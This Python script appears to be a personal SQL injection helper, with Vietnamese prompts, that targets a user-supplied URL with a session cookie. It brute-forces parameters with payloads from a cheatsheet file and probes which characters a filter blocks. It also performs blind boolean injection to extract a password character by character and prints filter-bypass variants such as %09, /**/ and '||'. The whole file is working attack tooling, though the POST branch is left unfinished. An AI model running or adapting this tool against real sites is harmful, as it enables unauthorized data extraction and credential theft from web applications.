import requests
import string


char = string.printable
session = requests.Session()

url = input("url hia :  ")
print("url : "  , url)
cookie = input("cookie neu co : ")
header = {
    'Cookie' : cookie
}
print(cookie)

# Brute force cheatsheet.txt Method Get
def Get_Easy_Bf(p): 
    f = open("cheatsheet.txt" , "r")   
    get = session.get(url = url , headers=header)
    len_r = len(get.text)
    print("length goc : " , len_r)
    for i in f:
        len_i = len(i)
        params = {
            p : i
        }
        get = session.get(url = url , headers=header , params=params)
        if len(get.text) - len_i != len_r:
            print(len(get.text) - len_i , i)
    f.close()

# Check filter
def Filter(p , list_filter):
    sp  = input("special character :")  # ex: No Hack ...
    for i in char:
       get = session.get(url = url , headers=header , params= { p : i})
       if (sp in get.text) and (len(get.text) - 1 < 100):
        print(i)
        list_filter.append(i)
    print(list_filter)

#Get boolean with payload
def Get_Boolean(p):
    while(True):
        print("1.test length")
        print("2.brute force")
        choose = int(input("your choice : "))
        if choose == 1:
            f2 = open("length.txt" , "r")
            list = []
            for ch in f2:
                print(ch)
                list.append(ch)
            user_ch = int(input("your choice : "))
            s_p = input("Sepecial params : ")
            for i in range (0,25):
                pw  = list[user_ch].replace("{pw}",s_p).replace("{i}",str(i))
                get = session.get(url = url , headers=header , params={p : pw[2:]} )
                print(len(get.text) , pw)
            f2.close()
        elif choose == 2:
            f1 = open("boolean.txt" , "r")
            list=[]        
            for ch in f1:                
                print(ch)
                list.append(ch)
            print("99. custom payload")           
            user_ch = int(input("your choice : "))            
            if user_ch == 99:
                pw_choose = "1." + input("payload : ")
            else:
                pw_choose = list[user_ch]
            sp = input("special: ")
            len_pw = int(input("length :"))
            password = ""
            s_p = input("Sepecial params : ")
            for i in range(1,len_pw):
                for j in char:
                    pass_1 = password + j
                    pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
                    get = session.get(url = url , headers=header , params=f"{p}={pw[2:]}")            
                    if (sp in get.text):
                        print(len(get.text) , pw[2:] ,get.url)                      
                        password = password + j
                        print(password)
                        break
            f1.close()

#Get Payload have filter replace
def Get_Filter(list_filter):
    print(list_filter)
    while(True):
        list_payload = []
        payload = input("Your payload : ")
        for i in list_filter:
            if i in payload:
                list_payload.append(i)
        for i in list_payload:
            if i == " ":
                #/**/, %0a, %09, %0d, (), +
                print(payload.replace(i , "%09"))
                print(payload.replace(i , "%0a"))
                print(payload.replace(i , "%0d"))
                print(payload.replace(i , "()"))
                print(payload.replace(i , "+"))
                print(payload.replace(i , "/**/"))
                break
            if i == "or":
                print(payload.replace(i , "||"))
                break
            if i not in list_payload:
                print("payload : " , payload)
                break
        break

#Post Brute Force Data
def Post_Easy_Bf(data):
    f = open("cheatsheet.txt" , "r")

    sp = input("Sepecial str :")
    for i in f:
        data[d[bf_data]] = i    
        post = session.post(url = url , headers= header , data=data)
        if sp not in post.text:
            print(len(post.text) , i )



list_filter = [] 
while(True):
    print("1.GET")
    print("2.POST")
    choose = int(input("choose : "))
    if choose == 1:
        p = input("params : ")
        print("1.Check filter")
        print("2.Easy payload brute force")
        print("3.Boolean sql")
        print("4.Your payload + filter bypass ")
        choose_get = int(input("choose : "))
        if choose_get == 1 :
            Filter(p , list_filter)
        elif choose_get == 2:
            Get_Easy_Bf(p)
        elif choose_get == 3:
            Get_Boolean(p)
        elif choose_get == 4:
            Get_Filter(list_filter)
    elif choose == 2: # khoi tao data
        c = int(input("How many data : "))
        d = []
        for i in range(0,c):
            d.append(input("Data %d : " %(i)))
        bf_data = int(input("Choose data to bf : "))
        data = {}
        for i in range(0,len(d)):
            if i != bf_data:
                add = {
                    d[i] : input("%s : " %(d[i]))
                }
                data.update(add)
            else:
                add = {
                    d[i] : "test"
                }
                data.update(add)
        print("1.Check filter")
        print("2.Easy payload brute force")
        print("3.Boolean sql")
        print("4.Your payload + filter bypass ")
        choose_post = int(input("choose : "))
        if choose_post == 1:
            break
        elif choose_post == 2:
            print(data)
            Post_Easy_Bf(data)





        

